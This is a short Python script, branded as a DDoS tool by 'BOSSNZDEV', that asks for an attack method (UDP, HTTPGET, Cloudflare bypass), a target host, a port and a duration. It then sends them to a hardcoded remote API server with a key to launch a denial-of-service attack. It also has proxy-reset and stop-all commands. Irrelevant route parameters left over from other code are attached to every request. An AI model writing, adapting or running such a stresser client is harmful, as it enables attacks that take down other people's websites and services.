import requests
from random import randint
import time
import colorama
import random

text = """   
    ____ ____  ____  _____
   / __ \/ __ \/ __ \/ ___/____
  / / / / / / / / / /\__ \/_  /
 / /_/ / /_/ / /_/ /___/ / / /_
/_____/_____/\____//____/ /___/
    """
colors = list(vars(colorama.Fore).values())
colored_chars = [random.choice(colors) + char for char in text]

print(''.join(colored_chars))

print("""
\033["""+str(randint(0,1))+""";"""+str(randint(31,36))+"""m
DDOS SCRIPT BY : BOSSNZDEV
\033[0m
""")

#กรุณาอย่าลบเครดิตครับ:D

#====config=====
API = "206.189.147.138"
key="b0f0124ce70c5d0c3d668c050bfb67ea"
#====config=====

time.sleep(2)

print("METHOD ALL [\nddos : UDP, HTTPGET, CFBYPASS\nOther : RESETPROXY, STOPALL\n]\n")
method = input("method : ")


print('\n')

params = dict(
    origin='Chicago,IL',
    destination='Los+Angeles,CA',
    waypoints='Joplin,MO|Oklahoma+City,OK',
    sensor='false'
  )

if method == "resetproxy":
  url = "http://"+API+"/?key="+key+"&method=proxy"
  resp = requests.get(url=url, params=params)
  data = resp.json()
  print(data['status'])
elif method == "RESETPROXY":
  url = "http://"+API+"/?key="+key+"&method=proxy"
  resp = requests.get(url=url, params=params)
  data = resp.json()
  print(data['status'])
elif method == "stopall":
  url = "http://"+API+"/?key="+key+"&method=stopall"
  resp = requests.get(url=url, params=params)
  data = resp.json()
  print(data['status'])
elif method == "STOPALL":
  url = "http://"+API+"/?key="+key+"&method=stopall"
  resp = requests.get(url=url, params=params)
  data = resp.json()
  print(data['status'])
else :
  host = input("IP/DOMAIN : ")
  port = input("PORT (80 - 443) : ")
  time = int(input("TIME (limit 1 - 300) : "))
  print('\n')
  if time > 300:
    print("ERROR : Forbidden time of more than 300 seconds");
  else :
    timestr = str(time)
    url = " http://"+API+"/?key="+key+"&method="+method+"&host="+host+"&port="+port+"&time="+timestr
    resp = requests.get(url=url, params=params)
    data = resp.json()
    print(data['status'])

print('\n\nDDOS ATTACK BY BOSSNZDEV!')